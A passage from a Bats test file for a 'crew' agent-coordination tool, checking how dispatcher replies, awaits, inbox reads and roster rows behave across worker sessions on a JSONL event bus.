  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ "$output" = "worker:feat/x#s1-1" ]
}

@test "reply: a non-worker target is untouched" {
  CREW_ID=c1 run_crew reply "metrics:c1" "{}"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ "$output" = "metrics:c1" ]
}

@test "reply: a directive for session 1 is not delivered to session 2" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c1 run_crew reply "worker:feat/x" "STOP - do not push"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  CREW_ID=c1 run_crew status "worker:feat/x#s2-2" working
  run run_crew inbox "worker:feat/x#s2-2" c1
  [ -z "$output" ]
  run run_crew inbox "worker:feat/x#s1-1" c1
  [[ "$output" == *"STOP - do not push"* ]]
}

@test "reply: branch-only address where branch contains '#' resolves via _sessions (not treated as sid)" {
  local branch="feat/12-a#b"
  local sid="s1234567890-12345"
  local worker_id="worker:${branch}#${sid}"

  # seed a live session for the branch
  CREW_ID=c1 run_crew status "$worker_id" working
  CREW_ID=c1 run_crew reply "worker:${branch}" "go"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ "$output" = "$worker_id" ]
}

@test "reply: a session-less watchdog post after the live session does not strand the reply (#173)" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1789446258-532666" working
  seed_raw worker:feat/x blocked "prompt: interactive prompt in pane %186" watchdog "$(($(date +%s) * 1000 + 1000))"
  CREW_ID=c1 run_crew reply "worker:feat/x" "ship it after the fix"
  run run_crew inbox "worker:feat/x#s1789446258-532666" c1
  [[ "$output" == *"ship it after the fix"* ]]
}

@test "reply: a session-less failed after a live session refuses as terminal" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/x#s1-1" working "" "" "$t"
  seed_raw worker:feat/x failed "dead: quiet: unchanged for 1800s" watchdog "$((t + 1000))"
  CREW_ID=c1 run run_crew reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ -z "$output" ]
}

@test "reply: a branch with only session-less non-terminal rows exits non-zero and writes nothing" {
  seed_raw worker:feat/x working "" ""
  CREW_ID=c1 run run_crew reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  [[ "$output" == *"no session id"* ]]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ -z "$output" ]
}

@test "reply: a session-less heartbeat after a finished session refuses" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/x#s1-1" done "" "" "$t"
  seed_raw worker:feat/x working "" "" "$((t + 1000))"
  CREW_ID=c1 run run_crew reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ -z "$output" ]
}

@test "reply: a session-less row in the same millisecond as a finished session refuses" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/x#s1-1" done "" "" "$t"
  seed_raw worker:feat/x working "" "" "$t"
  CREW_ID=c1 run run_crew reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ -z "$output" ]
}

@test "reply: a session-less row after a resume row reaches the resumed session" {
  t=$(($(date +%s) * 1000))
  seed_start dispatch s1-1 "$t"
  seed_raw "worker:feat/x#s1-1" working "" "" "$((t + 1000))"
  seed_start resume s2-2 "$((t + 2000))"
  seed_raw worker:feat/x blocked "prompt: interactive prompt in pane %9" watchdog "$((t + 3000))"
  CREW_ID=c1 run_crew reply "worker:feat/x" "resume-directive"
  run run_crew inbox "worker:feat/x#s2-2" c1
  [[ "$output" == *"resume-directive"* ]]
}

# Bounded wait until the wall-clock ms passes the newest bus row, so the next
# row sorts strictly after it.
bus_tick() {
  local blog last i=0
  blog="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  last=$(jq -s 'map(.ts) | max // 0' "$blog")
  while [ "$(jq -nc 'now*1000|floor')" -le "$last" ] && [ "$i" -lt 400 ]; do
    sleep 0.005
    i=$((i + 1))
  done
}

# For a backgrounded sender: runs "$@" once the await under test has parked on
# the virtual clock at least once, so the message really arrives mid-wait. Pair
# with a --timeout long enough that the await cannot expire first.
after_await_parks() {
  local v0 i=0
  while [ ! -s "$CREW_CLOCK" ] && [ "$i" -lt 1000 ]; do
    sleep 0.01
    i=$((i + 1))
  done
  v0=$(cat "$CREW_CLOCK")
  while [ "$(cat "$CREW_CLOCK")" = "$v0" ] && [ "$i" -lt 2000 ]; do
    sleep 0.01
    i=$((i + 1))
  done
  "$@"
}

@test "await: a branch-only worker id exits non-zero" {
  CREW_ID=c1 run run_crew await "worker:feat/x" --timeout 1
  [ "$status" -eq 1 ]
  [[ "$output" == *"no session suffix"* ]]
}

@test "await: a sessioned id still receives a reply" {
  (
    CREW_ID=c1 after_await_parks bash -euo pipefail "$CREW" reply "worker:feat/x#s1-1" hi
  ) >/dev/null 2>&1 &
  CREW_ID=c1 run run_crew await "worker:feat/x#s1-1" --timeout 300 --interval 1
  wait
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"hi"'* ]]
}

# #240: a reply appended after the worker's question but before `crew await`
# started was hidden behind await's own `start=now` cursor and lost. The wait is
# anchored on the per-sender delivered mark, so a reply that landed in that gap
# is still delivered.
@test "await: a reply that landed before await starts is delivered" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why?"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"answer"'* ]]
}

# #760: a second blocked episode. The first answer is delivered and marked; the
# reply to the second question lands before the second await starts and must
# still come out at once, not on a later cycle.
@test "await: a reply already on the bus in a second blocked episode is delivered" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "Q1"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "A1"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [[ "$output" == *'"body":"A1"'* ]]
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "Q2"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "A2"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 300 --interval 1
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"A2"'* ]]
}

# #760: the note a timed-out await prints is the only evidence a worker has that
# the full wait elapsed, so it reports the time actually waited.
@test "await: the timeout note reports the elapsed wait" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 7 --interval 3
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"await ended after 9s"* ]]
}

# #385: the dispatcher's reply can cross the worker's own question in flight —
# the reply lands first, the question second. The question must not hide it: a
# msg is due until this session has actually been handed it (the per-sender
# delivered mark), not until the session's latest outbound question.
@test "await: a reply that crossed the worker's question is delivered" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew reply "$id" "answer"
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why?"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"answer"'* ]]
}

# The delivered mark is per sender, not "latest outbound to anyone": a later
# outbound to a third party must not hide an earlier reply from the dispatcher.
@test "await: a later outbound to a third party does not hide an earlier reply" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why?"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer"
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "worker:feat/y#s2-2" "unrelated"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"answer"'* ]]
}

# #240-era pin flipped for #385: the old anchor dropped A1 once Q2 moved past
# it, and the title called that "not redelivered" — but A1 was never handed out
# at all. An unread answer is handed out exactly once whatever question follows.
@test "await: an unread answer survives a newer question and is handed out once" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "Q1"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "A1"
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "Q2"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"A1"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "A2"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"A2"'* ]]
}

# #290: a reply await has already handed this session is not handed back by a
# later await. The delivered mark lives per session and per sender, so a fresh
# question to the same counterpart (or a reply from anyone else) still delivers.
@test "await: a second await with no new question does not re-deliver the reply" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why?"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"answer"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "await: a delivered critic verdict is not re-delivered while awaiting the next critic" {
  id="worker:feat/x#s1-1"
  spec="role:feat/x:spec-critic"
  plan="role:feat/x:plan-critic"
  CREW_ID=c1 run_crew msg "$id" "$spec" "review spec"
  bus_tick
  CREW_ID=c1 run_crew msg "$spec" "$id" "spec verdict"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"spec verdict"'* ]]
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "$plan" "review plan"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  bus_tick
  CREW_ID=c1 run_crew msg "$plan" "$id" "plan verdict"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"plan verdict"'* ]]
}

@test "await: a delivered dispatcher reply is not re-delivered after critic traffic" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why?"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"answer"'* ]]
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "role:feat/x:plan-critic" "review plan"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ -z "$output" ]
}

# The mark is per sender: delivering A's reply must not swallow B's reply that
# landed earlier and is still undelivered (parallel assignments, #240).
@test "await: delivering one sender's reply leaves another sender's earlier reply deliverable" {
  id="worker:feat/x#s1-1"
  a="role:feat/x:spec-critic"
  b="role:feat/x:reviewer"
  CREW_ID=c1 run_crew msg "$id" "$a" "qa"
  CREW_ID=c1 run_crew msg "$id" "$b" "qb"
  bus_tick
  CREW_ID=c1 run_crew msg "$b" "$id" "vb"
  bus_tick
  CREW_ID=c1 run_crew msg "$a" "$id" "va"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"va"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"vb"'* ]]
}

# #300: a lead waiting on one role's verdict must not be released by another
# sender's reply. --from restricts the candidates to one exact sender; the other
# sender's msg is left undelivered for a later plain await.
@test "await --from: another sender's newer-so-far reply neither returns nor is consumed" {
  id="worker:feat/x#s1-1"
  plan="role:feat/x:plan-critic"
  rev="role:feat/x:reviewer"
  CREW_ID=c1 run_crew msg "$id" "$plan" "review plan"
  CREW_ID=c1 run_crew msg "$id" "$rev" "review diff"
  bus_tick
  CREW_ID=c1 run_crew msg "$plan" "$id" "plan verdict"
  (
    CREW_ID=c1 after_await_parks bash -euo pipefail "$CREW" msg "$rev" "$id" "review verdict"
  ) >/dev/null 2>&1 &
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --from "$rev" --timeout 300 --interval 1
  wait
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"review verdict"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [[ "$output" == *'"body":"plan verdict"'* ]]
}

@test "await --from: a timeout names the sender and exits 0 with empty stdout" {
  id="worker:feat/x#s1-1"
  plan="role:feat/x:plan-critic"
  rev="role:feat/x:reviewer"
  CREW_ID=c1 run_crew msg "$id" "$plan" "review plan"
  bus_tick
  CREW_ID=c1 run_crew msg "$plan" "$id" "plan verdict"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --from "$rev" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"$rev"* ]]
}

# #385 under --from: the restriction narrows the sender, not the watermark. A
# reply from the awaited sender that predates the question (it crossed it in
# flight) is still unread, so it is returned.
@test "await --from: a reply that crossed the question to that sender is delivered" {
  id="worker:feat/x#s1-1"
  rev="role:feat/x:reviewer"
  CREW_ID=c1 run_crew msg "$rev" "$id" "verdict"
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "$rev" "review diff"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --from "$rev" --timeout 0
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"verdict"'* ]]
}

@test "await --from: requires a value" {
  CREW_ID=c1 run --separate-stderr run_crew await "worker:feat/x#s1-1" --from
  [ "$status" -eq 1 ]
  [[ "$stderr" == *"--from needs a value"* ]]
}

# The straggler fold (`crew inbox --since`) is how a reply that missed a timed-out
# await is taken; it must count as delivered too, or the next await hands it back.
@test "await: a reply taken through the inbox fold is not re-delivered by the next await" {
  id="worker:feat/x#s1-1"
  spec="role:feat/x:spec-critic"
  plan="role:feat/x:plan-critic"
  CREW_ID=c1 run_crew msg "$id" "$spec" "review spec"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ -z "$output" ]
  bus_tick
  CREW_ID=c1 run_crew msg "$spec" "$id" "spec verdict"
  CREW_ID=c1 run --separate-stderr run_crew inbox "$id" c1 --since 0
  [[ "$output" == *'"body":"spec verdict"'* ]]
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "$plan" "review plan"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ -z "$output" ]
}

# The delivered mark is the whole contract: a reply already handed out by inbox
# is not returned by a following await, even after a new question to the same
# sender — the question does not re-open it.
@test "await: a reply already handed out by inbox is not returned after a later question" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "Q1"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer"
  CREW_ID=c1 run --separate-stderr run_crew inbox "$id" c1 --since 0
  [[ "$output" == *'"body":"answer"'* ]]
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "Q2"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

# A torn or garbage delivered-marks file must not blind await: it reads as empty
# and the reply is still delivered.
@test "await: an unreadable delivered-marks file does not hide a reply" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why?"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"answer"'* ]]
  state=$(git rev-parse --path-format=absolute --git-common-dir)/crew/await
  for f in "$state"/*; do printf '{"dispatcher:c1":5}"x":6}' >"$f"; done
  bus_tick
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why2?"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer2"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"answer2"'* ]]
}

# Delivered state is per session: a resumed session (new id) starts clean.
@test "await: delivered state does not carry to another session" {
  CREW_ID=c1 run_crew msg "worker:feat/x#s1-1" "dispatcher:c1" "why?"
  bus_tick
  CREW_ID=c1 run_crew reply "worker:feat/x#s1-1" "answer"
  CREW_ID=c1 run --separate-stderr run_crew await "worker:feat/x#s1-1" --timeout 5 --interval 1
  [[ "$output" == *'"body":"answer"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "worker:feat/x#s2-2" --timeout 0
  [ -z "$output" ]
  CREW_ID=c1 run_crew msg "worker:feat/x#s2-2" "dispatcher:c1" "why2?"
  bus_tick
  CREW_ID=c1 run_crew reply "worker:feat/x#s2-2" "answer2"
  CREW_ID=c1 run --separate-stderr run_crew await "worker:feat/x#s2-2" --timeout 5 --interval 1
  [[ "$output" == *'"body":"answer2"'* ]]
}

# Status rows carry no delivery semantics at all: a watchdog/blocked row is not
# a msg, so a bus of status rows alone yields an empty await; and it neither
# marks nor hides a reply — an unread reply is delivered once, then not again.
@test "await: a watchdog-sourced blocked status neither delivers nor hides a reply" {
  id="worker:feat/x#s1-1"
  seed_raw "$id" blocked "prompt: interactive prompt in pane %9" watchdog
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  CREW_ID=c1 run_crew reply "$id" "answer"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"answer"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

# A hard kill mid-append leaves a torn trailing line (crew.sh documents this
# crash mode; tests/crews.bats pins the same tolerance for `crews`). await must
# still read the well-formed reply above it, not abort the whole log read.
@test "await: a torn trailing log line does not hide a reply" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "why?"
  bus_tick
  CREW_ID=c1 run_crew reply "$id" "answer"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  printf '{"ts":1785951264000,"crew_id":"c-to' >>"$log"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"answer"'* ]]
}

# #466: a burst from one sender that arrived while the worker was busy used to
# be reduced to its newest msg — the delivered mark then hid every older
# sibling from later awaits. One await must hand out the whole backlog from
# that sender, oldest first, exactly once each.
@test "await: a same-sender burst is handed out in one await, oldest first" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew msg "dispatcher:c1" "$id" "m1"
  bus_tick
  CREW_ID=c1 run_crew msg "dispatcher:c1" "$id" "m2"
  bus_tick
  CREW_ID=c1 run_crew msg "dispatcher:c1" "$id" "m3"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5 --interval 1
  [[ "$output" == *'"body":"m1"'* ]]
  [[ "$output" == *'"body":"m2"'* ]]
  [[ "$output" == *'"body":"m3"'* ]]
  # oldest first: m1 before m3 in the stream
  [[ "${output%%m3*}" == *'"body":"m1"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ -z "$output" ]
}

# #466 same-ms siblings: two msgs from one sender sharing one millisecond ts are
# one watermark unit — await must hand both out in the same call, or one is
# hidden from every later await. Chosen behaviour: the whole same-ms group is
# delivered together, oldest (log order) first, and never re-handed.
@test "await: same-ms siblings are handed out together, not hidden" {
  id="worker:feat/x#s1-1"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  t=$(($(date +%s) * 1000))
  for b in first second; do
    jq -nc --arg to "$id" --argjson ts "$t" --arg b "$b" \
      '{ts:$ts, crew_id:"c1", from:"dispatcher:c1", to:$to, kind:"msg", body:$b}' >>"$log"
  done
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [[ "$output" == *'"body":"first"'* ]]
  [[ "$output" == *'"body":"second"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ -z "$output" ]
}

# #466 consumer check (`--from`, the grid role loop): the awaited role's whole
# due backlog is handed out in one call, oldest first, so a note that rode in
# with the verdict cannot be silently dropped.
@test "await --from: the awaited role's due backlog comes as one batch" {
  id="worker:feat/x#s1-1"
  rev="role:feat/x:reviewer"
  CREW_ID=c1 run_crew msg "$rev" "$id" "note"
  bus_tick
  CREW_ID=c1 run_crew msg "$rev" "$id" "verdict"
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --from "$rev" --timeout 5 --interval 1
  [[ "$output" == *'"body":"note"'* ]]
  [[ "$output" == *'"body":"verdict"'* ]]
  [[ "${output%%verdict*}" == *'"body":"note"'* ]]
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --from "$rev" --timeout 0
  [ -z "$output" ]
}

# #186: the WORKER_PROTOCOL "Report to the bus" blocked→await loop keeps a
# blocked worker inside `crew await` in bounded cycles, so a dispatcher reply
# is delivered in-band instead of stranding the worker. These tests pin the
# composition of the crew commands that loop relies on, using `--timeout 0`
# (an instant timeout) and directly seeded bus rows — the fake-clock pattern,
# no real sleeps. The `crew status`/`crew await`/`crew inbox` commands
# themselves are covered by their own tests; here the loop's delivery paths
# and its ending are pinned.

@test "blocked-cycle: a reply arriving in a later cycle is still delivered in-band" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run run_crew status "$id" working
  CREW_ID=c1 run run_crew status "$id" blocked "why?"
  # Cycle 1: the window has nothing in it, so it times out (exit 0, empty
  # stdout — the timeout marker). --separate-stderr: the "await ended" note
  # goes to stderr, so $output is genuinely the reply stream.
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  CREW_ID=c1 run run_crew status "$id" blocked "why? (cycle 1 of 24)"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  jq -nc --arg to "$id" --argjson ts "$(jq -nc 'now*1000|floor')" \
    '{ts:$ts, crew_id:"c1", from:"dispatcher:c1", to:$to, kind:"msg", body:"answer"}' >>"$log"
  # Cycle 2: the reply is unread, so await returns it on its first check and the
  # worker resumes in place.
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 5
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"answer"'* ]]
  CREW_ID=c1 run run_crew status "$id" working "resumed"
  # No failure was ever posted.
  run jq -sr '[.[] | select(.kind=="status" and .body.state=="failed")] | length' "$log"
  [ "$output" = "0" ]
}

@test "blocked-cycle: a reply that missed the await is caught by the straggler fold" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run run_crew status "$id" working
  CREW_ID=c1 run run_crew status "$id" blocked "why?"
  # Cycle 1 times out empty...
  CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  # ...and the dispatcher's reply lands after that window closed. It is unread,
  # so a later `crew await` would deliver it too; the worker protocol's
  # straggler fold — `crew inbox --since <seen>` after every timeout — is the
  # path that takes it here and resumes the worker. The fold stays load-bearing
  # for what `await` does not reach — another sender's due backlog, and msgs
  # that land between its read and the fold's.
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  t=$(($(date +%s) * 1000))
  jq -nc --arg to "$id" --argjson ts "$t" \
    '{ts:$ts, crew_id:"c1", from:"dispatcher:c1", to:$to, kind:"msg", body:"answer"}' >>"$log"
  CREW_ID=c1 run --separate-stderr run_crew inbox "$id" c1 --since 0
  [ "$status" -eq 0 ]
  [[ "$output" == *'"body":"answer"'* ]]
  CREW_ID=c1 run run_crew status "$id" working "resumed"
  run jq -sr '[.[] | select(.kind=="status" and .body.state=="failed")] | length' "$log"
  [ "$output" = "0" ]
}

@test "blocked-cycle: budget exhaustion fails exactly once after every cycle re-stamped blocked" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run run_crew status "$id" working
  CREW_ID=c1 run run_crew status "$id" blocked "why?"
  # A 3-cycle budget on an empty bus: every cycle re-stamps blocked (the
  # per-cycle liveness signal), and the budget's exhaustion posts exactly one
  # failed — never one per cycle, never zero.
  i=1
  while [ "$i" -le 3 ]; do
    CREW_ID=c1 run --separate-stderr run_crew await "$id" --timeout 0
    [ "$status" -eq 0 ]
    [ -z "$output" ]
    CREW_ID=c1 run run_crew status "$id" blocked "why? (cycle $i of 24)"
    i=$((i + 1))
  done
  CREW_ID=c1 run run_crew status "$id" failed "blocked, no dispatcher reply"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  # every cycle re-stamped blocked (3 cycle rows), and the budget's
  # exhaustion posted exactly one failed with the canonical detail.
  run jq -sr '[.[] | select(.kind=="status" and .body.state=="blocked") | select(.body.detail | contains("cycle"))] | length' "$log"
  [ "$output" = "3" ]
  run jq -sr '[.[] | select(.kind=="status" and .body.state=="failed")] | length' "$log"
  [ "$output" = "1" ]
  run jq -sr '[.[] | select(.kind=="status" and .body.state=="failed")][0].body.detail' "$log"
  [ "$output" = "blocked, no dispatcher reply" ]
}

# A torn trailing line (hard-kill crash mode) must not blind the straggler fold:
# inbox still prints the msgs it could parse, as it did before it recorded marks.
@test "inbox: a torn log line does not hide the msgs above it" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew reply "$id" "answer"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  printf '{"ts":1785951264000,"crew_id":"c-to' >>"$log"
  CREW_ID=c1 run --separate-stderr run_crew inbox "$id" c1 --since 0
  [[ "$output" == *'"body":"answer"'* ]]
}

@test "inbox: a branch-only worker id exits non-zero" {
  run run_crew inbox "worker:feat/x" c1
  [ "$status" -eq 1 ]
  [[ "$output" == *"no session suffix"* ]]
}

@test "roster: collapses sessions of one branch into a single row" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  CREW_ID=c1 run_crew status "worker:feat/x#s2-2" working
  run run_crew roster c1
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].branch')" = "feat/x" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "working" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s2-2" ]
  [ "$(echo "$output" | jq -r '.[0].sessions | length')" = "2" ]
  [ "$(echo "$output" | jq -r '.[0].sessions[0].state')" = "done" ]
  [ "$(echo "$output" | jq -r '.[0].sessions[1].state')" = "working" ]
}

@test "roster: exposes the newest dispatch or resume engine_session" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  jq -nc '{ts:1,crew_id:"c1",kind:"dispatch",branch:"feat/x",engine_session:"aaaa"}' >>"$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].engine_session')" = "aaaa" ]
  jq -nc '{ts:9999999999999,crew_id:"c1",kind:"resume",branch:"feat/x",engine_session:"bbbb"}' >>"$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].engine_session')" = "bbbb" ]
}

@test "roster: the codename still derives from the branch" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  expected="$(run_crew identity feat/x | jq -r .name)"
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].name')" = "$expected" ]
}

@test "roster: one session's exited is not resolved from another's history" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/x#s2-2" exited
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].state')" = "exited" ]
  [ "$(echo "$output" | jq -r '.[0].prev_state // "none"')" = "none" ]
}

@test "roster: a false exited with a live wrapped pane resolves to the previous state" {
  git commit --allow-empty -q -m init
  git branch feat/roster-live
  wt_path="$BATS_TEST_TMPDIR/roster-live-wt"
  git worktree add -q "$wt_path" feat/roster-live
  # $BATS_TEST_TMPDIR sits under macOS's /var, a symlink to /private/var; git
  # resolves it but a hardcoded stub path here wouldn't, so canonicalize to
  # match what a real tmux pane_current_path (kernel cwd) always reports.
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_tmux "" "$(printf '.claude-wrapped %s\n' "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/roster-live#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/roster-live#s1-1" exited
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].state')" = "working" ]
  [ "$(echo "$output" | jq -r '.[0].exit_suspect')" = "true" ]
}

@test "roster: an exited session with no engine pane stays exited" {
  git commit --allow-empty -q -m init
  git branch feat/roster-dead
